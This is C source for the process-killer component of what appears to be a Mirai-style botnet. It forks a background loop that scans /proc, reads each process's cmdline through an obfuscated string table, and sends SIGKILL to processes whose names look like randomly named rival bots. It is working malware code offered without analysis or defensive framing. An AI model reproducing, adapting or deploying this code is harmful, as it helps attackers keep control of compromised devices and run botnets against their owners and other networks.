#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "headers/includes.h"
#include "headers/killer.h"
#include "headers/table.h"
#include "headers/util.h"

int killer_pid = 0;

BOOL killer_mirai_exists(char *pid) {

    char rdpath[PATH_MAX] = {0};
    char rdbuf[128] = {0};

    /* llalalalallaa */

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_CMDLINE);

    util_strcpy(rdpath, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    util_strcat(rdpath, pid);
    util_strcat(rdpath, table_retrieve_val(TABLE_KILLER_CMDLINE, NULL));

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_CMDLINE);

    int fd = open(rdpath, O_RDONLY);

    if (fd <= 0) {
        return FALSE;
    }

    read(fd, rdbuf, sizeof(rdbuf));
    close(fd);

    /* read can return a wrong length, we just use strlen() */
    int len = util_strlen(rdbuf);

    if (len == 0)
        return FALSE;

    int digits = 0, alpha_nums = 0;

    for (int i = 0; i < len; i++) {

        if (util_isdigit(rdbuf[i]))
            digits++;

        else if (util_isalpha(rdbuf[i]))
            alpha_nums++;
        else
            return FALSE;
    }

    return (alpha_nums >= 5 & digits >= 2);
}

void killer_kill(void) {
    if (killer_pid != 0)
        kill(killer_pid, 9);
}

void killer_init(void) {

    struct dirent *file = NULL;

    killer_pid = fork();

    if (killer_pid != 0)
        return;

#ifdef DEBUG
    printf("[killer/init]: starting memory scan on (pid: %d)\n", getpid());
#endif

    while (TRUE) {

        table_unlock_val(TABLE_KILLER_PROC);

        DIR *dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL));

        table_lock_val(TABLE_KILLER_PROC);

        if (!dir) {
    #ifdef DEBUG
            printf("[killer/err]: failed to open /proc");
    #endif

            exit(1);
        }

        while ((file = readdir(dir))) {

            if (*file->d_name < '0' || *file->d_name > '9')
                continue;

            int pid = util_atoi(file->d_name);

            if (pid == getppid() || pid == getpid())
                continue;

            if (killer_mirai_exists(file->d_name)) {
    #ifdef DEBUG
                printf("[killer/kill]: killing process %s\n", file->d_name);
    #endif
                kill(pid, 9);
            }
        }

        closedir(dir);
        usleep(10*100000);
    }
}
